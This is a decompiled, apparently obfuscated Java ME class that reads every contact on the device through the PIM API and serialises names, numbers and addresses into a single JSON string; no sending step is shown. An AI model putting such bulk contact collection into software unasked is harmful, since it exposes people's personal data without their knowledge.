package defpackage;

import java.util.Enumeration;
import javax.microedition.pim.Contact;
import javax.microedition.pim.PIM;
import javax.microedition.pim.PIMList;

/* renamed from: Z  reason: default package */
class Z {
    Z() {
    }

    static String Code() {
        PIM instance = PIM.getInstance();
        int i = 0;
        String[] listPIMLists = instance.listPIMLists(1);
        StringBuffer stringBuffer = new StringBuffer(512);
        StringBuffer stringBuffer2 = new StringBuffer(128);
        int i2 = 0;
        while (i2 < listPIMLists.length) {
            int i3 = 0;
            while (true) {
                if (i3 < i2) {
                    try {
                        if (listPIMLists[i2].equals(listPIMLists[i3])) {
                            i2++;
                            break;
                        }
                        i3++;
                    } catch (Throwable th) {
                        i2++;
                    }
                } else {
                    PIMList openPIMList = instance.openPIMList(1, 1, listPIMLists[i2]);
                    Enumeration items = openPIMList.items();
                    while (items.hasMoreElements()) {
                        try {
                            Contact contact = (Contact) items.nextElement();
                            int[] fields = contact.getFields();
                            int i4 = 0;
                            while (i4 < fields.length) {
                                try {
                                    int i5 = fields[i4];
                                    if (!(i5 < 100 || i5 > 118 || i5 == 108 || i5 == 113 || i5 == 117)) {
                                        int countValues = contact.countValues(i5);
                                        int fieldDataType = openPIMList.getFieldDataType(i5);
                                        StringBuffer stringBuffer3 = new StringBuffer("[");
                                        for (int i6 = 0; i6 < countValues; i6++) {
                                            StringBuffer stringBuffer4 = new StringBuffer();
                                            if (fieldDataType == 4) {
                                                String string = contact.getString(i5, i6);
                                                if (string != null) {
                                                    stringBuffer4.append('\"').append(Code(string)).append('\"');
                                                }
                                            } else if (fieldDataType == 5) {
                                                stringBuffer4.append("[");
                                                String[] stringArray = contact.getStringArray(i5, i6);
                                                for (int i7 = 0; i7 < stringArray.length; i7++) {
                                                    if (stringArray[i7] != null && stringArray[i7].length() > 0) {
                                                        stringBuffer4.append('\"').append(Code(stringArray[i7])).append("\",");
                                                    }
                                                }
                                                stringBuffer4.setCharAt(stringBuffer4.length() - 1, ']');
                                            }
                                            if (stringBuffer4.length() > 2) {
                                                stringBuffer3.append((Object) stringBuffer4).append(',');
                                            }
                                        }
                                        stringBuffer3.setCharAt(stringBuffer3.length() - 1, ']');
                                        if (stringBuffer3.length() > 1) {
                                            if (stringBuffer2.length() > 0) {
                                                stringBuffer2.append(',');
                                            }
                                            stringBuffer2.append('\"').append((char) i5).append("\":").append((Object) stringBuffer3);
                                        }
                                    }
                                    i4++;
                                } catch (Throwable th2) {
                                    i4++;
                                }
                            }
                            if (i > 0) {
                                stringBuffer.append(',');
                            }
                            stringBuffer.append('{').append(stringBuffer2.toString()).append('}');
                            stringBuffer2.setLength(0);
                            i++;
                        } catch (Throwable th3) {
                        }
                    }
                    i2++;
                }
            }
        }
        return i > 0 ? stringBuffer.insert(0, "{\"c\":[").append("]}").toString() : "{\"c\":[]}";
    }

    private static String Code(String str) {
        StringBuffer stringBuffer = new StringBuffer(str.length());
        int i = 0;
        while (i < str.length()) {
            char charAt = str.charAt(i);
            if (charAt < ' ' || charAt == '\"' || charAt == '\\') {
                stringBuffer.append("\\u").append(charAt < 16 ? "000" : "00").append(Integer.toHexString(charAt));
                i++;
            } else {
                stringBuffer.append(charAt);
                i++;
            }
        }
        return stringBuffer.toString();
    }
}
